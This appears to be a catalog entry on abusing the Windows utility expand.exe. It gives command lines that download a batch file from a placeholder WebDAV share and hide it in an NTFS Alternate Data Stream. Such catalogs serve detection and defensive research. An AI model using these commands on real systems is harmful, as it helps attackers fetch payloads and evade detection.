---
name: expand.exe
description: Expands one or more compressed files. You can use this command to retrieve compressed files from distribution disks.
functions:
  download:
    - description: Copies source file to destination.
      code: expand \\webdav\folder\file.bat c:\ADS\file.bat
  copy:
    - description: Copies source file to destination.
      code: expand c:\ADS\file1.bat c:\ADS\file2.bat
  ads:
    - description: Copies source file to destination Alternate Data Stream (ADS).
      code: expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
resources: 
    - resource: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/expand
    - resource: https://twitter.com/infosecn1nja/status/986628482858807297
    - resource: https://twitter.com/Oddvarmoe/status/986709068759949319
fullpath: 
    - path: c:\windows\system32\expand.exe
    - path: c:\windows\sysWOW64\expand.exe
notes:
---